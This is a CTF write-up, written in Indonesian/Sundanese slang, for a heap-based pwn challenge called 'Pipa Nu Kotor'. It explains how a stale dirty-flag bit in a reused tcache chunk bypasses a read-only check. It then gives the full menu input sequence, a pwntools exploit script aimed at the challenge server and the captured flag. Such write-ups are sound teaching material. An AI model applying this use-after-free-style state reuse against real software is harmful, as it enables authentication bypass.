# Pipa Nu Kotor — NFX CTF (Pwn, 240 pts)

## Info Awal

File yg dikasih cuma 1 binary, `pipa`. Dari hint-nya udah agak ketauan arahnya:

> Ulah langsung percaya kana ukuran data anu ditarima.
> Perhatikeun kumaha heap ngatur alokasi jeung struktur data.
> Talatah anu datang ti luar bisa mawa kaayaan anu teu disangka-sangka.

Intinya disuruh jangan percaya size yg dikasih user, trs merhatiin cara heap ngatur alokasi, sama ada "keadaan" yg kebawa2 dari request sebelumnya. Dari judulnya aja "Pipa Nu Kotor" udah kebayang ini niru-niru konsep **Dirty Pipe (CVE-2022-0847)**.

```
file pipa
pipa: ELF 64-bit LSB executable, x86-64, not stripped
```

Gak stripped jd enak buat dibaca, langsung objdump aja.

## Analisis Binary

Binary ini semacam "pipe manager" sederhana, menu-nya:

```
[0] daftar pipa
[1] buka pipa
[2] tutup pipa
[3] tulis ke pipa
[4] baca dari pipa
[5] login
[6] keluar
```

Tiap pipa itu struct 24 byte (`malloc(0x18)`) di heap, layout-nya kira2 gini stlh dibaca disasemnya:

```
+0x00  ptr buf        -> alamat buffer data (heap / atau nunjuk ke global shadow_page)
+0x08  size_t cap      -> kapasitas (default 0x40)
+0x10  int ro_flag     -> 0 = rw, 1 = ro (protected/shadow)
+0x14  int flags       -> bit 0x10 artinya "udah pernah ditulis" (dirty)
```

Yg bikin menarik: ada 1 pipa "spesial" yg kalo pas `buka pipa` mode-nya diisi `ro`, dia bakal nunjuk ke buffer global `shadow_page`. Buffer ini isinya **password buat login**, di-generate random pake `/dev/urandom` di awal program jalan (format kyk salt crypt `$6$....$`).

Karena `ro_flag=1`, pipa ini harusnya gak bisa ditulis. Tp di `op_tulis` ada pengecualian:

```c
if (pipe->ro_flag != 0) {
    if (pipe->flags & 0x10) {
        // lolos, boleh nulis walau RO
    } else {
        // ditolak: "halaman dilindungi (baca-saja)"
    }
}
```

Jd kalo bit `0x10` di field flags udah ke-set duluan, proteksi RO-nya ke-skip. Field flags ini sendiri ke-set otomatis stlh nulis berhasil ke pipa manapun.

## Bug-nya

Struct pipa itu di-`malloc(0x18)`. Pas `tutup pipa`, yg di-free cuma buffer data sama struct-nya doang — tp byte `flags` (offset 0x14) itu **gak pernah di-reset/di-zero**. Dan pas chunk 0x18 ini dipake lagi (reuse) buat pipa baru, glibc/tcache cuma nimpa 16 byte pertama chunk (buat metadata next+key), sisanya (termasuk offset 0x14) masih nyisa data lama.

Jadinya kalo urutannya:

1. buka pipa mode `rw`
2. tulis apa aja ke pipa itu → bit dirty (0x10) ke-set
3. tutup pipa itu → chunk struct-nya di-free, tp byte flags-nya masih nempel keset
4. buka pipa baru mode `ro` → alloc-nya reuse chunk yg td di-free → stale bit dirty ikut kebawa
5. pipa `ro` yg baru ini udah dianggap "pernah ditulis" pdhl blm pernah → proteksi RO langsung bisa di-skip

Trs tinggal tulis password pilihan sendiri ke pipa "protected" ini, trs login pake password yg sama. Gak perlu tau random password aslinya sm sekali.

Satu hal yg mesti diinget: nulis ke pipa itu nul-terminate-nya di posisi `buf[kapasitas-1]`, bukan di akhir data yg kita kirim. Jd kalo datanya kurang dari kapasitas (0x40), bakal ada sisa garbage di tengah2 string-nya trs bikin `strcmp` pas login gagal mulu. Solusinya ya isi penuh persis 63 karakter (1 byte terakhir otomatis di-nol-in sama program).

## Exploit

Urutan commandnya:

```
1          -> buka pipa mode rw
rw
3          -> tulis ke pipa index 0
0
x
2          -> tutup pipa index 0
0
1          -> buka pipa lg, mode ro (reuse chunk, dirty bit kebawa)
ro
3          -> tulis password sendiri ke pipa "protected" ini
0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
5          -> login pake password yg sama persis
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Script-nya (pakai pwntools, fallback socket biasa kalo pwntools gak ada):

```python
from pwn import remote

HOST = "s1.nfx.my.id"
PORT = 47276
PASSWORD = "A" * 63

io = remote(HOST, PORT)

def menu(c):
    io.sendlineafter(b"pilihan : ", c.encode())

menu("1"); io.sendlineafter(b"mode (rw/ro) : ", b"rw")
menu("3"); io.sendlineafter(b"index : ", b"0"); io.sendlineafter(b"data : ", b"x")
menu("2"); io.sendlineafter(b"index : ", b"0")
menu("1"); io.sendlineafter(b"mode (rw/ro) : ", b"ro")
menu("3"); io.sendlineafter(b"index : ", b"0"); io.sendlineafter(b"data : ", PASSWORD.encode())
menu("5"); io.sendlineafter(b"password : ", PASSWORD.encode())

io.interactive()
```

Jalanin, trs login berhasil, flag langsung kekirim.

## Flag

```
NFX{Si44aTehKuduSadarDip4lakSave3Jari1}
```

## Kesimpulan

Bug utamanya murni soal **lifetime object di heap yg gak di-manage dgn bener** — field `flags` yg nyisa dari chunk lama (stale state) dipake buat nge-bypass validasi, mirip persis sama ide dasar Dirty Pipe di kernel. Gak perlu ROP, gak perlu leak alamat apa2, cuma manfaatin kebiasaan allocator yg reuse memory tanpa nge-zero semua field struct-nya.
